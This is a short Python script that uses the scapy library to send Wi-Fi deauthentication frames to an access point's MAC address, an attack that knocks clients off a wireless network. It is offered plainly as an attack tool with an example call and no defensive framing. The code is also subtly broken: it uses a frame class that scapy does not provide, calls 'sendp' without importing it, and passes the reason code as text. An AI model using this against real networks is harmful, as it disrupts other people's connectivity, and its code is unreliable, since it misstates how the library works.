import scapy.all as scapy

def deauthenticate_clients(ap_mac, deauth_reason=None):
    # Define the deauthentication frame
    deauth = scapy.WLANDeauth(addr=ap_mac)
    if deauth_reason:
        deauth.reason = deauth_reason

    # Send the deauthentication frame
    sendp(deauth, verbose=0)

# Example usage:
ap_mac = "00:11:22:33:44:55"
deauth_reason = "Reason Code 1"
deauthenticate_clients(ap_mac, deauth_reason)